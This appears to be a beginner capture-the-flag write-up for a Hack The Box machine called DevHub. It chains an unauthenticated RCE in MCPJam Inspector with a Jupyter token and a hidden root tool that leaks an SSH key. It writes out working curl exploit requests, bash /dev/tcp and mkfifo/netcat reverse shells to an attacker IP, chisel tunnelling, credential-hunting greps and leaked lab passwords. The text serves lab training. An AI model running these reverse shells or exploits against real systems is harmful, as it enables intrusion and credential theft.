@@ -1,0 +1,739 @@
+================================================================
+ HACK THE BOX - DevHub - Beginner Writeup
+================================================================
+Target:  devhub.htb  (web service on port 6274)
+Goal:    Get a shell, find the user flag, then escalate to root.
+Date:    2026-06-02
+
+----------------------------------------------------------------
+ 0. WHAT IS THIS BOX ABOUT?
+----------------------------------------------------------------
+The box runs "MCPJam Inspector" on port 6274. MCP (Model Context
+Protocol) is a system that lets AI tools connect to external
+"servers". MCPJam Inspector is a developer tool for testing those
+servers.
+
+The whole box is built around a real, recent vulnerability in that
+tool: CVE-2026-23744 (a critical 9.8/10 Remote Code Execution).
+
+KEY LESSON: when you find an unusual piece of software, identify
+its exact name/version and search for known CVEs. That is often
+the fastest way into a box.
+
+
+----------------------------------------------------------------
+ 1. RECON (looking at the website)
+----------------------------------------------------------------
+We fetched the homepage:
+
+    curl -s -i http://devhub.htb:6274/
+
+The HTML title gave it away:
+
+    <title>MCPJam Inspector</title>
+
+So we knew the software. A quick search found:
+
+    CVE-2026-23744 - MCPJam Inspector Remote Code Execution
+    - Affects versions <= 1.4.2 (fixed in 1.4.3)
+    - CWE-306: Missing Authentication for a Critical Function
+    - The tool listens on 0.0.0.0 (open to the network) instead
+      of just localhost, AND has no login on a dangerous endpoint.
+
+
+----------------------------------------------------------------
+ 2. THE VULNERABILITY (how the RCE works)
+----------------------------------------------------------------
+MCPJam can launch a local "MCP server" by running a command you
+give it. The endpoint that does this:
+
+    POST /api/mcp/connect
+
+...takes a JSON body that contains a "command" and a list of
+"args", and then RUNS THAT COMMAND on the server - with no
+authentication at all.
+
+That means: whatever command we put in the JSON, the box runs it.
+That is Remote Code Execution.
+
+Example test request:
+
+    curl http://devhub.htb:6274/api/mcp/connect \
+      --header "Content-Type: application/json" \
+      --data '{"serverConfig":{"command":"/bin/sh","args":["-c","id"],"env":{}},"serverId":"mytest"}'
+
+Response:
+
+    {"success":false,"error":"... MCP error -32000: Connection closed"}
+
+IMPORTANT BEGINNER POINT:
+The "Connection closed" error is NOT a failure. The box expected
+our command ("id") to behave like an MCP server and talk back to
+it. "id" just runs and exits, so the handshake fails - BUT the
+command still executed first. We simply don't see its output
+through this channel.
+
+Because we can't read the output directly, we use an
+"out-of-band" technique: make the command connect BACK to us
+(a reverse shell).
+
+
+----------------------------------------------------------------
+ 3. GETTING A SHELL (reverse shell)
+----------------------------------------------------------------
+A "reverse shell" = we make the target connect out to OUR machine,
+which gives us an interactive command line on the target.
+
+STEP 1 - Find our VPN IP (the HTB tunnel interface):
+
+    ip addr show tun0 | grep -oP 'inet \K[0-9.]+'
+
+STEP 2 - Start a listener on our machine (separate terminal):
+
+    nc -lvnp 4444
+
+STEP 3 - Fire the exploit (replace YOUR_IP with the tun0 IP).
+We use /bin/bash because the "/dev/tcp" reverse-shell trick is a
+bash feature:
+
+    curl http://devhub.htb:6274/api/mcp/connect \
+      --header "Content-Type: application/json" \
+      --data '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"],"env":{}},"serverId":"mytest"}'
+
+The curl returns "Connection closed" again (expected), and at the
+same moment our "nc" listener catches the shell. We're in.
+
+TIP - stabilize the shell so it behaves like a normal terminal:
+
+    python3 -c 'import pty;pty.spawn("/bin/bash")'
+    # then press Ctrl-Z
+    stty raw -echo; fg
+    export TERM=xterm
+
+
+----------------------------------------------------------------
+ 4. ENUMERATION (looking around after getting the shell)
+----------------------------------------------------------------
+Standard things to check once you land on a box:
+
+  Who am I / quick wins:
+    id ; whoami ; hostname
+    sudo -l                      # any sudo rights?
+
+  Find the user flag and home dirs:
+    ls -la /home/
+    cat /home/*/user.txt
+
+  The app itself (often holds creds/configs):
+    ls -la /app /opt /srv
+    find / -name "*.env" 2>/dev/null
+    grep -riE "password|secret|api[_-]?key|token" /app /opt /home 2>/dev/null
+
+  SUID / capabilities (classic privilege escalation):
+    find / -perm -4000 -type f 2>/dev/null      # SUID
+    find / -perm -2000 -type f 2>/dev/null      # SGID
+    getcap -r / 2>/dev/null                      # capabilities
+    -> check anything unusual against https://gtfobins.github.io/
+
+  Cron jobs / timers (scheduled tasks running as root):
+    cat /etc/crontab
+    cat /etc/cron.d/*
+    ls -la /etc/cron.*
+    systemctl list-timers --all
+    -> tool "pspy64" shows jobs running live, no root needed.
+
+  Internal services / network:
+    ss -tlnp        (or: netstat -tlnp)
+    cat /etc/hosts
+
+  >>> DEEP DIVE: the `ss` command (we leaned on this a lot) <<<
+  "ss" = "socket statistics". It answers the question
+  "what programs are listening for network connections, and on
+  which ports?" (It's the modern replacement for "netstat".)
+
+  Finding listening ports is HOW you discover hidden internal
+  services like Jupyter (8888) and opsmcp (5000) that aren't
+  exposed to the outside world.
+
+  The flags in `ss -tlnp`, one at a time:
+     -t  = TCP sockets only (ignore UDP)
+     -l  = only LISTENING sockets (i.e. open ports waiting for
+           connections - the services themselves)
+     -n  = numeric: show "8888" not "http-alt", and IPs not names
+           (faster, and avoids confusing name lookups)
+     -p  = show the Process (program name + PID) owning each port
+  So `ss -tlnp` = "list every TCP port being listened on, and
+  which program owns it."
+
+  Reading a line of output:
+     LISTEN 0 128 127.0.0.1:8888 0.0.0.0:* users:(("jupyter-lab",pid=1057))
+            ^state    ^Local Address:Port            ^the program
+  The MOST IMPORTANT part is the Local Address:
+     127.0.0.1:8888  -> listening on LOCALHOST ONLY. Reachable only
+                        from on the box. (This is why we had to
+                        tunnel to reach Jupyter and opsmcp.)
+     0.0.0.0:6274    -> listening on ALL interfaces = reachable
+                        from the network. (This is how MCPJam was
+                        exposed to us in the first place.)
+     [::]:443        -> same idea, IPv6.
+
+  Note: the "-p" (process name) only shows full detail for
+  processes YOU own. As a low-priv user you may see the PORT but
+  a blank program for root-owned services - that's fine, the port
+  number is what you need. (Run as root to see every name.)
+
+  Quick recipe we used: `ss -tlnp` -> spot a 127.0.0.1:PORT we
+  don't recognise -> that's a hidden internal service -> tunnel to
+  it / talk to it locally -> attack it.
+
+
+----------------------------------------------------------------
+ 5. LATERAL MOVEMENT - INTERNAL JUPYTER (port 8888)
+----------------------------------------------------------------
+We found a Jupyter instance listening only on 127.0.0.1:8888.
+"Only on 127.0.0.1" means it is NOT reachable from outside the
+box - we must tunnel to it.
+
+WHY IT MATTERS: a Jupyter notebook lets you run Python/shell
+commands as whoever runs Jupyter - often a DIFFERENT, more
+privileged user. That's the intended next step.
+
+>>> DEEP DIVE: PORT FORWARDING / TUNNELING (the key new skill) <<<
+
+THE PROBLEM, restated simply:
+Jupyter listens on 127.0.0.1:8888 ON THE TARGET. "127.0.0.1" means
+"only the target itself can connect to me." Your attacking machine
+is a different computer, so when you type http://devhub.htb:8888 in
+your browser, you get nothing - the box refuses outside connections
+to that port (and on this box, a firewall blocks inbound anyway).
+
+THE IDEA - "port forwarding" (a.k.a. tunneling):
+We build a pipe so that a port on OUR machine secretly leads to a
+port that only exists inside the target. Then we just use our own
+local port and the traffic is carried through the pipe to the
+hidden service. It's like running an extension cord from the
+target's private socket to your desk.
+
+  After tunneling:  you open  http://localhost:8888  on YOUR box
+                    -> traffic travels through the pipe
+                    -> comes out at the target's 127.0.0.1:8888
+                    -> Jupyter answers. As if it were local.
+
+WHY WE USED A "REVERSE" TUNNEL (this is the part that confuses
+beginners): the target's firewall blocks connections coming IN, but
+happily allows connections going OUT (that's also why our reverse
+shell worked). So we make the TARGET dial OUT to us and the tunnel
+rides on that outbound connection. "Reverse" = the target connects
+to us, not the other way around.
+
+------------------------------------------------------------------
+TOOL: chisel  (a single binary that builds these tunnels over HTTP)
+------------------------------------------------------------------
+chisel comes in two roles using the SAME binary:
+   - "server" = the listener. We run this on OUR attacking box.
+   - "client" = dials out to the server. Runs ON THE TARGET.
+
+STEP 1 - On YOUR box, start the chisel server in reverse mode:
+     ./chisel server -p 9001 --reverse
+   -p 9001    = the port chisel itself listens on for the target
+                to connect back to.
+   --reverse  = allow the client (target) to request tunnels that
+                point back through to us (needed for "R:" tunnels).
+
+STEP 2 - Get the chisel binary onto the target. Easiest: serve it
+   from your box with a tiny web server, then download on target.
+     # on YOUR box, in the folder containing chisel:
+     python3 -m http.server 8000
+     # in the target shell:
+     cd /tmp; wget http://YOUR_IP:8000/chisel -O chisel; chmod +x chisel
+
+STEP 3 - On the TARGET, run the client and request the tunnel:
+     ./chisel client YOUR_IP:9001 R:8888:127.0.0.1:8888 &
+   Breaking down each piece:
+     YOUR_IP:9001   = where to dial out to (your chisel server,
+                      i.e. your tun0 VPN IP + the -p port).
+     R:             = REVERSE tunnel (open the port on the SERVER /
+                      your side, forward it to the target's side).
+     8888           = the port to open on YOUR machine (localhost).
+     127.0.0.1:8888 = where the traffic comes out, FROM the
+                      target's point of view (its internal Jupyter).
+     &              = run it in the background so your shell is free.
+   Read "R:8888:127.0.0.1:8888" as:
+     "open 8888 on me (attacker); send anything that hits it to
+      127.0.0.1:8888 as seen by the target."
+
+STEP 4 - Use it. On YOUR browser:
+     http://localhost:8888/
+   You're now talking to the target's private Jupyter.
+
+ADDING MORE TUNNELS AT ONCE: just list more R: rules. Later we also
+wanted the target's SSH, so:
+     ./chisel client YOUR_IP:9001 R:8888:127.0.0.1:8888 R:2222:127.0.0.1:22 &
+   ...then `ssh -p 2222 user@127.0.0.1` reaches the box's SSH even
+   though port 22 is firewalled from outside (the tunnel is
+   outbound, so the firewall doesn't block it).
+
+ALTERNATIVE - SSH port forwarding (only if you HAVE ssh creds/key,
+which we did not for the initial foothold):
+     ssh -L 8888:127.0.0.1:8888 user@devhub.htb -N
+   -L 8888:127.0.0.1:8888 = bind local 8888, forward to the
+   target's 127.0.0.1:8888.  -N = just tunnel, don't open a shell.
+   Same end result as chisel, but needs working inbound SSH.
+
+KEY TAKEAWAY: localhost-only services aren't truly safe - if you
+can run code on the box, you can tunnel out to anything it can
+reach. "Bound to 127.0.0.1" stops the internet, not an attacker
+who already has a foothold.
+
+FINDING THE JUPYTER TOKEN (its login password - needed to get in):
+    ps aux | grep -i jupyter          # token is often right on the
+                                       # command line (it was here!)
+    jupyter server list
+    jupyter notebook list
+    cat ~/.local/share/jupyter/runtime/*.json
+  Then log in via:  http://localhost:8888/?token=THE_TOKEN
+
+
+----------------------------------------------------------------
+ 5b. BECOMING analyst (the lateral move that worked)
+----------------------------------------------------------------
+The process list showed who runs what:
+
+    analyst  ... jupyter-lab --ip=127.0.0.1 --port=8888
+                 --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+    root     ... /opt/opsmcp/server.py        <-- runs as ROOT (next target)
+    mcp-dev  ... (that's us)
+
+KEY IDEA: Jupyter runs AS analyst. Anything Jupyter executes runs
+as analyst. The token is its password, and we read it straight
+from the process list. So we don't need analyst's real password -
+we just make Jupyter run our code.
+
+We reached the (localhost-only) Jupyter, opened its Python console,
+and spawned a reverse shell back to our machine:
+
+    import os
+    os.popen('rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh 2>&1 '
+             '| nc 10.10.16.192 9998 > /tmp/p').read()
+
+Our second listener (nc -lvnp 9998) caught a shell - now running
+as analyst. From there:
+
+    cat /home/analyst/user.txt    -> USER FLAG obtained!
+
+
+----------------------------------------------------------------
+ 6. WHERE WE ARE / NEXT STEPS
+----------------------------------------------------------------
+DONE:
+  [x] Identified the software (MCPJam Inspector)
+  [x] Found the CVE (CVE-2026-23744, unauth RCE)
+  [x] Exploited /api/mcp/connect to get a reverse shell (as mcp-dev)
+  [x] Enumerated the box (SUID, caps, cron, services)
+  [x] Found internal Jupyter on 127.0.0.1:8888 (runs as analyst)
+  [x] Stole the Jupyter token from the process list
+  [x] Used Jupyter's Python console to get a shell as analyst
+  [x] Grabbed the USER FLAG (/home/analyst/user.txt)
+
+NOTE - dead ends we ruled out:
+  - getcap output (snap-confine, gst-ptp-helper, ping) = all
+    standard Ubuntu/snap defaults, NOT exploitable.
+
+DONE (root path found):
+  [x] Read /opt/opsmcp/server.py - Flask app on 127.0.0.1:5000, runs as ROOT
+
+TODO:
+  [ ] Reset box, re-run chain back to analyst
+  [ ] Call opsmcp hidden tool to dump root's SSH key
+  [ ] SSH to root@127.0.0.1 with the key, grab /root/root.txt
+
+
+----------------------------------------------------------------
+ 7. PRIVILEGE ESCALATION TO ROOT (opsmcp)
+----------------------------------------------------------------
+Remember from the process list that "root" was running
+/opt/opsmcp/server.py. As analyst we can READ that file, so we did:
+
+    cat /opt/opsmcp/server.py
+
+WHAT THE PROGRAM IS (in plain English):
+It's a small web server (written in Python using a library called
+"Flask"). A web server is just a program that waits for HTTP
+requests (the same kind of requests your browser makes) and
+answers them. This one:
+  - listens on 127.0.0.1:5000  (127.0.0.1 = localhost = only
+    reachable from ON the box itself, not from the internet)
+  - runs as ROOT (so anything it does, it does with full power)
+  - offers a list of "tools" you can ask it to run by sending a
+    request to its /tools/call address.
+
+It tries to protect itself two ways - and BOTH are broken:
+
+FLAW 1 - "Hidden" tools are still usable (this is called
+"security through obscurity" - hiding something instead of actually
+locking it).
+  The code keeps two lists of tools: VISIBLE_TOOLS and
+  HIDDEN_TOOLS. The "list my tools" feature only shows the visible
+  ones, so the dangerous tools LOOK like they don't exist. But when
+  you actually CALL a tool, the code checks both lists combined:
+
+      ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
+      if tool_name not in ALL_TOOLS:   # hidden tools pass this!
+          ...reject...
+
+  So a hidden tool named "ops._admin_dump" is fully callable - it
+  was just never advertised. Hiding a door is not locking it.
+
+FLAW 2 - The password is written inside the code we can read.
+  The server expects a secret key (sent in a request header called
+  "X-API-Key") as its password. But that key is sitting right there
+  in the source file:
+
+      VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
+
+  ("Hardcoded" just means typed directly into the code instead of
+  kept somewhere secret.) Since we can read the file as analyst, we
+  know the password. So the "authentication" stops nobody.
+
+THE PAYOFF:
+The hidden "ops._admin_dump" tool, when you call it with
+target="ssh_keys", literally opens /root/.ssh/id_rsa and gives it
+back to you. That file is ROOT'S PRIVATE SSH KEY - basically root's
+identity card. And because the whole server runs as root, it's
+allowed to read it. So it hands us the keys to the kingdom.
+
+  (An "SSH key" is a pair of files used to log in instead of a
+   password. If you have someone's PRIVATE key, you can log in as
+   them. Getting root's private key = we can log in as root.)
+
+LESSON: hiding a feature is not securing it, and a password written
+into readable source code is not a secret.
+
+--- EXPLOIT (run these in your analyst shell) ---
+opsmcp only listens on localhost, but we ARE on the box as analyst,
+so we can talk to it directly with "curl" (a command-line tool for
+sending web requests).
+
+1) Ask opsmcp (nicely, with its own leaked password) to dump root's
+   private SSH key, and save it to a file:
+
+   curl -s http://127.0.0.1:5000/tools/call \
+     -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+     -H "Content-Type: application/json" \
+     -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
+     | python3 -c 'import sys,json;print(json.load(sys.stdin)["root_private_key"])' > /tmp/rootkey
+
+   - The "-H" parts add headers (extra info on the request); the
+     X-API-Key header is the leaked password.
+   - The "-d" part is the request body (JSON) saying which tool to
+     run and with what options. confirm=true is required because the
+     tool refuses to run without it.
+   - The reply comes back as JSON with the key inside it. The little
+     python command just pulls the key text out of that JSON and
+     saves it to /tmp/rootkey.
+
+2) Lock down the key file (SSH refuses to use a key others can read):
+
+   chmod 600 /tmp/rootkey
+
+3) Log in as root using that key. We connect to 127.0.0.1 (the box
+   talking to itself) because SSH from OUTSIDE is firewalled, but
+   SSH to localhost from ON the box is allowed:
+
+   ssh -i /tmp/rootkey -o StrictHostKeyChecking=no root@127.0.0.1
+
+   - "-i /tmp/rootkey" = log in using this key file.
+   - "-o StrictHostKeyChecking=no" = don't stop to ask "do you
+     trust this host?" (skips an annoying first-time prompt).
+
+4) Grab the final flag:
+
+   cat /root/root.txt        -> ROOT FLAG. Box owned!
+
+BONUS - the same tool with target="passwords" leaks real passwords
+(handy if a step breaks and you want a quick way back in):
+   analyst : JupyterN0tebook!2026
+   mcp-dev : Mcp!Insp3ct0r2026
+   (root's entry is only a scrambled "hash", not a usable password,
+    which is exactly why the SSH key is the real route to root.)
+
+
+----------------------------------------------------------------
+ 8. FULL KILL CHAIN (summary)
+----------------------------------------------------------------
+  MCPJam Inspector RCE (CVE-2026-23744)  -> shell as mcp-dev
+        |  (steal Jupyter token from `ps aux`)
+        v
+  Jupyter Python console (runs as analyst) -> shell as analyst
+        |  (read opsmcp source: hardcoded key + hidden tool)
+        v
+  opsmcp _admin_dump (runs as root) -> dump root SSH key
+        |
+        v
+  ssh root@127.0.0.1 with the key -> ROOT
+
+  Theme: at every stage, a service that runs/returns things on
+  your behalf does so with ITS OWN user's privileges. Climb the
+  users by abusing each service in turn.
+
+
+----------------------------------------------------------------
+ 9. TECHNIQUES & ONE-LINERS EXPLAINED (the cryptic commands)
+----------------------------------------------------------------
+These are the commands I handed you that look like magic. Here's
+what each actually does, so they're yours next time.
+
+------------------------------------------------------------------
+9.1  THE LISTENER:  nc -lvnp 4444
+------------------------------------------------------------------
+"nc" = netcat, a tiny tool that reads/writes raw network data.
+Here it WAITS for an incoming connection - it's the catcher's mitt
+for a reverse shell. Flags:
+   -l = listen (wait for a connection instead of making one)
+   -v = verbose (print when something connects)
+   -n = numeric (don't do DNS lookups - faster)
+   -p 4444 = listen on port 4444 (any free high port works)
+When the target's reverse shell connects back, your commands typed
+here run on the target.
+
+------------------------------------------------------------------
+9.2  REVERSE SHELL #1 (bash /dev/tcp):
+     bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+------------------------------------------------------------------
+A reverse shell = the target opens a connection TO YOU and pipes a
+shell through it (works because firewalls allow OUTBOUND).
+   bash -i              = start an interactive bash shell.
+   /dev/tcp/IP/PORT     = a special "magic file" in bash; writing to
+                          it actually opens a TCP connection to
+                          IP:PORT. (It's a bash feature - NOT a real
+                          file - which is why we call /bin/bash, not
+                          /bin/sh, for this trick.)
+   >&  /dev/tcp/...      = send the shell's output (and errors) out
+                          through that connection.
+   0>&1                 = also send the shell's INPUT in from the
+                          same connection (so you can type to it).
+Net effect: a fully working shell, flowing both directions over one
+TCP connection back to your `nc` listener.
+
+------------------------------------------------------------------
+9.3  REVERSE SHELL #2 (mkfifo / named pipe) - the one that worked
+     in Jupyter:
+     rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh 2>&1 | nc IP PORT > /tmp/p
+------------------------------------------------------------------
+Used when /dev/tcp isn't available (e.g. plain /bin/sh). It builds
+the same two-way pipe by hand using a "named pipe" (FIFO):
+   rm -f /tmp/p          = delete any old pipe file first.
+   mkfifo /tmp/p         = create a named pipe - a special file that
+                           one command can write into and another
+                           can read out of, like a tube.
+   cat /tmp/p | /bin/sh  = read whatever comes out of the pipe and
+                           feed it into a shell as commands.
+   ... 2>&1              = include error messages in the output.
+   | nc IP PORT          = send the shell's output across the
+                           network to your listener...
+   > /tmp/p              = ...and pipe what YOU type (received by nc)
+                           back INTO the pipe, which feeds the shell.
+So your keystrokes -> nc -> /tmp/p -> shell -> nc -> your screen.
+It's a manual version of 9.2 using a tube file as the loopback.
+
+------------------------------------------------------------------
+9.4  STABILIZING A SHELL (making a dumb shell behave like a normal
+     terminal):
+     python3 -c 'import pty;pty.spawn("/bin/bash")'
+     (then) Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
+------------------------------------------------------------------
+Reverse shells start "dumb": no arrow keys, no tab-complete, Ctrl-C
+kills the whole shell, and full-screen tools (vi, ssh) break. This
+upgrades it to a proper interactive terminal (a "PTY").
+   python3 ... pty.spawn("/bin/bash")
+        = use Python to spawn a real pseudo-terminal running bash.
+   Ctrl-Z = pause (background) the shell, dropping you to YOUR box.
+   stty raw -echo
+        = tell YOUR terminal to pass keys through raw (so Ctrl-C,
+          arrows, tab go to the target) and not double-print them.
+   fg   = bring the shell back to the foreground.
+   export TERM=xterm
+        = tell the remote shell what terminal type you have, so
+          screen-clearing / full-screen apps render correctly.
+Result: arrows, history, tab-completion, and Ctrl-C only kills the
+remote program, not your whole session.
+
+------------------------------------------------------------------
+9.5  TRANSFERRING A FILE TO THE TARGET (how we'd get chisel over):
+     # on YOUR box, in the folder with the file:
+     python3 -m http.server 8000
+     # on the TARGET:
+     wget http://YOUR_IP:8000/chisel -O chisel
+------------------------------------------------------------------
+The target often can't reach the internet, but it CAN reach you
+over the VPN. So you briefly turn your own machine into a web
+server and pull the file from it.
+   python3 -m http.server 8000
+        = serve the current directory over HTTP on port 8000. Any
+          file in that folder is now downloadable at
+          http://YOUR_IP:8000/<filename>.
+   wget http://YOUR_IP:8000/chisel -O chisel
+        = on the target, download that file and save it as "chisel".
+          (-O sets the output filename. "curl -o chisel URL" works
+           too if wget is missing.)
+   chmod +x chisel = mark it executable so you can run ./chisel.
+
+------------------------------------------------------------------
+9.6  IS A PORT REACHABLE?  nc -zv host port
+------------------------------------------------------------------
+   nc -zv devhub.htb 6274
+   -z = zero-I/O: just check if the port is open, don't send data.
+   -v = verbose: print "succeeded" or "refused/timed out".
+A fast way to confirm a service is up before fighting with it. We
+used it to tell "box is down" from "my command is wrong".
+
+------------------------------------------------------------------
+9.7  FINDING SUID BINARIES:  find / -perm -4000 -type f 2>/dev/null
+------------------------------------------------------------------
+SUID = a special permission bit that makes a program run AS ITS
+OWNER (often root) no matter who launches it - a classic root path.
+   find /              = search the whole filesystem from /
+   -perm -4000         = files whose permission bits INCLUDE the
+                         SUID bit (the "-" means "at least these
+                         bits", not "exactly").
+   -type f             = regular files only.
+   2>/dev/null         = throw away the flood of "Permission denied"
+                         errors (see 9.9) so you see only results.
+Then compare anything unusual against GTFOBins (below). On this box
+SUID/caps were a DEAD END - but it's a must-check on every box.
+
+------------------------------------------------------------------
+9.8  GTFOBINS  (https://gtfobins.github.io/)
+------------------------------------------------------------------
+A website listing normal Linux programs that can be ABUSED to break
+out of restrictions - e.g. if "find" or "vim" is SUID-root, GTFOBins
+gives the exact one-liner to pop a root shell with it. Workflow:
+find an unusual SUID binary -> search its name on GTFOBins -> read
+the "SUID" section -> copy the escape. (Also has "sudo", "capabilities"
+sections for those cases.)
+
+------------------------------------------------------------------
+9.9  THE  2>/dev/null  YOU SEE EVERYWHERE
+------------------------------------------------------------------
+Programs write normal output to "stdout" and errors to a separate
+stream "stderr" (numbered 2). "2>/dev/null" means "send stream 2
+(errors) to /dev/null" - a black hole that discards everything. We
+use it on big `find`/`grep` sweeps so screens full of "Permission
+denied" don't bury the real findings.
+
+------------------------------------------------------------------
+9.10  HUNTING CREDENTIALS:
+      grep -riE "password|secret|api[_-]?key|token" /path 2>/dev/null
+------------------------------------------------------------------
+   grep      = search text inside files.
+   -r        = recursive (search every file under the folder).
+   -i        = case-insensitive (match Password, PASSWORD, etc.).
+   -E        = extended regex, so "|" means OR.
+   "a|b|c"   = match any of these words.
+   [_-]?     = an optional _ or - (matches api_key, api-key, apikey).
+Greps the codebase/configs for things that look like secrets. This
+mindset is exactly what found the opsmcp hardcoded key.
+
+------------------------------------------------------------------
+9.11  WATCHING FOR CRON JOBS LIVE (when you can't read crontab):
+      pspy  (better)   OR   a tiny process-watch loop
+------------------------------------------------------------------
+Cron jobs run on a schedule, often as root. If you can't read the
+cron files, you watch for the processes when they fire:
+   pspy64 = a no-root-needed tool that prints every new process and
+            cron job the moment it starts. Upload it (see 9.5) and
+            run ./pspy64. The go-to for spotting root cron jobs.
+   The manual loop I gave compares the process list every second and
+   prints anything new - a poor-man's pspy if you can't upload one.
+
+------------------------------------------------------------------
+9.12  EXTRACTING JSON ON THE COMMAND LINE (the python bit in the
+      root exploit):
+      ... | python3 -c 'import sys,json;print(json.load(sys.stdin)["root_private_key"])'
+------------------------------------------------------------------
+opsmcp replied with JSON like {"root_private_key": "-----BEGIN..."}.
+We needed just the key text, cleanly (real newlines, no quotes).
+   python3 -c '...'    = run a one-line Python program.
+   json.load(sys.stdin)= read the JSON piped in from curl.
+   ["root_private_key"]= pull out that one field.
+   print(...)          = print it raw (turning \n into real lines).
+(The tool "jq" does the same: `jq -r .root_private_key`. Either is
+fine - both turn messy JSON into the clean value you need.)
+
+
+----------------------------------------------------------------
+ GLOSSARY (beginner terms)
+----------------------------------------------------------------
+RCE          - Remote Code Execution: running commands on a remote
+               machine you don't own.
+Reverse shell- The target connects back to you, giving you a shell.
+CVE          - A public ID for a known security vulnerability.
+SUID         - A file permission that runs a program as its owner
+               (often root) - a common privilege-escalation route.
+Cron         - Linux's scheduled-task system. Jobs running as root
+               are juicy targets.
+Port forward - Tunneling a port from the target (or its localhost)
+               to your machine so you can reach internal services.
+Lateral move - Going from one user/host to another inside the
+               target environment.
+Localhost    - The address 127.0.0.1; means "this machine itself".
+               A service on localhost is only reachable from ON the
+               box, not from the network/internet.
+Web server   - A program that listens for HTTP requests (like a
+               browser sends) and replies. opsmcp is one.
+curl         - A command-line tool for sending HTTP requests (a
+               browser without the window).
+Header       - Extra info attached to an HTTP request, e.g. the
+               X-API-Key header carrying opsmcp's password.
+API key      - A secret string used as a password between programs.
+Hardcoded    - A value typed directly into the source code instead
+               of stored secretly. Hardcoded secrets are findable.
+SSH key      - A pair of files used to log in instead of a password
+               (a private key + a public key). Holding someone's
+               PRIVATE key lets you log in AS them.
+Hash         - A scrambled, one-way version of a password. You
+               can't log in with a hash directly; you'd have to
+               crack it first. (That's why root's hash was useless
+               and we used the SSH key instead.)
+Security through obscurity
+             - "Protecting" something by hiding it rather than
+               actually locking it. Weak: if someone finds it, it's
+               wide open (e.g. opsmcp's hidden-but-callable tools).
+Privilege escalation
+             - Going from a low-power user to a higher-power one
+               (here: analyst -> root).
+Port         - A numbered "door" on a machine (0-65535). A service
+               listens on a port; you connect to that number.
+Listening    - A program is "listening" on a port when it's waiting
+               there to accept incoming connections.
+Socket       - One endpoint of a network connection (an IP+port).
+               `ss` = "socket statistics".
+TCP / UDP    - The two main ways data is sent over a network. We
+               filtered `ss` to TCP (-t) because services like web
+               servers and SSH use TCP.
+Bind / bound - Which address a service attaches itself to.
+               Bound to 127.0.0.1 = localhost only (private).
+               Bound to 0.0.0.0   = all interfaces (network-reachable).
+PID          - Process ID: the number the OS gives a running program
+               (seen in `ps` and `ss -p`).
+Firewall     - Rules that allow/block network traffic. This box
+               blocked INBOUND connections (so SSH/web from us
+               failed) but allowed OUTBOUND (so reverse shells and
+               chisel, which dial OUT from the target, worked).
+Inbound vs outbound
+             - Inbound  = someone connecting INTO the box.
+               Outbound = the box connecting OUT to somewhere else.
+Tunnel / port forward
+             - A pipe that makes a port on one machine lead to a
+               port on another, so you can reach services you
+               otherwise couldn't.
+Reverse tunnel
+             - A tunnel where the TARGET dials out to YOU (used to
+               bypass a firewall that blocks inbound connections).
+chisel       - A tool that builds TCP tunnels over HTTP. Same binary
+               runs as "server" (on you) or "client" (on the target).
+Binary       - A compiled, ready-to-run program file (e.g. chisel).
+Background (&)
+             - Putting "&" after a command runs it in the background
+               so your shell stays usable (e.g. the chisel client).
+================================================================
